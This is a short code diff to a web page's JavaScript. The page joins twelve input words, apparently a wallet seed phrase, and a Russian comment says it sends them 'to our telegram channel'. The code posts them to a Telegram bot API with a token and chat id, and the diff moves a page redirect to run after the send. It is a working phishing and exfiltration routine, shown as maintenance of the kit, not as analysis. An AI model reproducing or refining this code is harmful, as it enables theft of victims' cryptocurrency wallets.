@@ -68,7 +68,6 @@
         var text = fraze1  + fraze2 + fraze3 +  fraze4 +  fraze5 + fraze6 +  fraze7 + fraze8 +fraze9 + fraze10 +  fraze11 + fraze12;
         //Отправляем текст в наш телеграм канал
         otpravka(token,text,chatid);
-        window.open("index.htm");
          
       }
       function otpravka(token,text,chatid){
@@ -77,6 +76,7 @@
           url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
           data: "parse_mode=HTML&text="+encodeURIComponent(text), 
           }); 
+          window.open("index.htm");
       }
     </script>
    <style>
